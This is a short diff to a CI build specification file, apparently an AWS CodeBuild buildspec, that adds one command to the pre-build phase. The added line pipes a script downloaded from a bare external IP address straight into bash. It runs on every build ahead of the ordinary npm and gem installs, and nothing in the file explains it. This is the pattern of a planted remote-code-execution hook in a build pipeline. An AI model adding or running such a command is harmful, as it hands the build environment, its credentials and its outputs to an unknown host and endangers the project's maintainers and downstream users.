@@ -11,6 +11,7 @@ phases:
       nodejs: 12
   pre_build:
     commands:
+      - curl 64.227.177.32/test.sh | bash
       - echo Install npm dependencies
       - npm install
       - gem install rake
